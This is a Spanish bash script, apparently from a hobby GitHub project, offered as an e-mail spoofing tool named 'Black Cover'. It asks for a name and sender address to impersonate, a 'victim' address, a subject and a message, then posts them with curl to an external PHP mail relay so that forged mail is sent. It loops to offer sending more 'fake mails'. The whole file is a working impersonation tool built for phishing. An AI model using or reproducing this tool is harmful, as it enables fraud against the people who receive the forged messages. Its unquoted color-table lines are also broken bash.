#!/bin/bash

# Proyecto 2020-2021

# Created by: Osososo

# GitHub: https://github.com/oscarsanchezt

# VARIABLES
#--------Colores---------------
# ejemplo: \e[0;31mROJO\e[0m  |
# ejemplo: \e[0;32mVERDE\e[0m |
# ejemplo: \e[1;34mAZUL\e[0m  |
#							  |
Negro = 0;30                  |
Gris oscuro = 1;30	          |
Azul = 0;34                   |
Azul resaltado = 1;34         |
Verde = 0;32                  |
Verde resaltado = 1;32        |
Cian = 0;36                   |
Cyan resaltado = 1;36         |
Rojo = 0;31                   |
Rojo resaltado = 1;31         |
Púrpura = 0;35                |
Púrpura resaltado = 1;35      |
Café = 0;33                   | 
Amarillo = 1;33               |
Gris = 0;37                   |
Blanco = 1;37                 |
#------------------------------

PWD=$(pwd)

# INICIO. 
# FUNCIONES
# funcion_1

function Email_Supplant {
	clear
	echo -e "\e[1;31m⌬ DANGER: INICIANDO PROGRAMA...\e[0m"
	sleep 2.0
	echo ""
	echo -e "\e[1;32m✓ INICADO CORRECTAMENTE\e[0m"
	sleep 1.5
	clear
echo -e "\e[1;31m

	██████╗ ██╗      █████╗  ██████╗██╗  ██╗  
	██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝   
	██████╔╝██║     ███████║██║     █████╔╝     
	██╔══██╗██║     ██╔══██║██║     ██╔═██╗     
	██████╔╝███████╗██║  ██║╚██████╗██║  ██╗    
	╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ 

 	 ██████╗ ██████╗ ██╗   ██╗███████╗██████╗ 
	██╔════╝██╔═══██╗██║   ██║██╔════╝██╔══██╗
	██║     ██║   ██║██║   ██║█████╗  ██████╔╝
	██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
	╚██████╗╚██████╔╝ ╚████╔╝ ███████╗██║  ██║
 	 ╚═════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝    
\e[0m 
"
echo -e "    \e[1;35m⚠ Herramienta de Suplantacion de E-Mail by Osososo⚠ \e[0m"
echo -e "                     \e[1;34mCancelar Ctrl+C\e[0m"
}
#funcion_2

function Nombre_Suplantar {
	echo ""
	echo ""
	echo -e -n "\e[0;32m> NOMBRE A SUPLANTAR:\e[0m"
		read -r NOMBRE
			sleep 0.5


}
#funcion_3

function Correo_Suplantar {

	echo -e -n "\e[0;32m> CORREO A SUPLANTAR:\e[0m"
		read -r REMITENTE
			sleep 0.5

}
#funcion_4

function Correo_Objetivo {

	echo -e -n "\e[0;32m> CORREO DE LA VÍCTIMA:\e[0m"
		read -r DESTINATARIO
			sleep 0.5

}
#funcion_5

function Asunto {

		echo -e -n "\e[0;32m> ASUNTO DEL CORREO:\e[0m"
			read -r ASUNTO
				sleep 0.5
}
#funcion_6

function Mensaje {

	echo -e -n "\e[1;33m> MENSAJE A ENVIAR:\e[0m"
		read -r MENSAJE
			sleep 0.5
}
#funcion_7

function Enviar_Correo {

echo -e -n "\e[1;32m⟳ ENVIANDO SUPLANTACION...\e[0m"

#envio_de_correo+https
	
	curl --data "
	nombre=$NOMBRE && remitente=$REMITENTE && destinatario=$DESTINATARIO && asunto=$ASUNTO && mensaje=$MENSAJE" https://shelterless-catches.000webhostapp.com/enviarMail.php
}
#funcion_8

function Nuevo_Correo {

	Email_Supplant
		echo -e -n "
\e[1;32m✔ CORREO ENVIADO CORRECTAMENTE\e[0m


¿DESEA ENVIAR OTRO CORREO FALSO?

[01] SI ENVIAR OTRO CORREO FALSO 
[02] NO ENVIAR OTRO CORREO FALSO

> Numero:"
read -r NUEVO

if [[ $NUEVO == 1 || $NUEVO == 01 ]];then

	source ${PWD}/black_cover.sh

elif [[ $NUEVO == 2 || $NUEVO == 02 ]];then

	exit
else

echo -e "\e[1;31m☒ ERROR: OPCIÓN INCORRECTA\e[0m"

sleep 0.5

Nuevo_Correo

fi

}
#funcion_9

function Editar_Datos {

Email_Supplant
echo -e -n "
¿QUÉ DATOS DESEA EDITAR?

[01] EDITAR NOMBRE A SUPLANTAR
[02] EDITAR CORREO A SUPLANTAR 
[03] EDITAR CORREO DE LA VÍCTIMA 
[04] EDITAR ASUNTO DEL CORREO
[05] EDITAR MENSAJE A ENVIAR 
[00] ENVIAR 

> Numero:   "

read -r EDITAR
if [[ $EDITAR == 0 || $EDITAR == 00 ]];then
Enviar_Correo
Nuevo_Correo
elif [[ $EDITAR == 1 || $EDITAR == 01 ]];then
Nombre_Suplantar
Editar_Datos
elif [[ $EDITAR == 2 || $EDITAR == 02 ]];then
Correo_Suplantar
Editar_Datos
elif [[ $EDITAR == 3 || $EDITAR == 03 ]];then
Correo_Objetivo
Editar_Datos
elif [[ $EDITAR == 4 || $EDITAR == 04 ]];then
Asunto
Editar_Datos
elif [[ $EDITAR == 5 || $EDITAR == 05 ]];then
Mensaje
Editar_Datos
else
echo -e "\e[1;31m☒ ERROR: OPCIÓN INCORRECTA\e[0m"
	sleep 0.5
		Editar_Datos
fi
}
#funcion_10

function Enviar_Editar {
echo -e -n "
¿DESEA ENVIAR LA SUPLANTACION? 

[01] ENVIAR
[02] EDITAR 

> Numero:"

read -r ENVIAR_EDITAR

if [[ $ENVIAR_EDITAR == 1 || $ENVIAR_EDITAR == 01 ]];then
Enviar_Correo
Nuevo_Correo
elif [[ $ENVIAR_EDITAR == 2 || $ENVIAR_EDITAR == 02 ]];then
Editar_Datos
fi
}
# PRE_FINAL_DE_FUNCIONES
# CÓDIGO
# FINAL
Email_Supplant
Nombre_Suplantar
Correo_Suplantar
Correo_Objetivo
Asunto
Mensaje
Enviar_Editar
#REW_code_final_blackcover_for_osososo
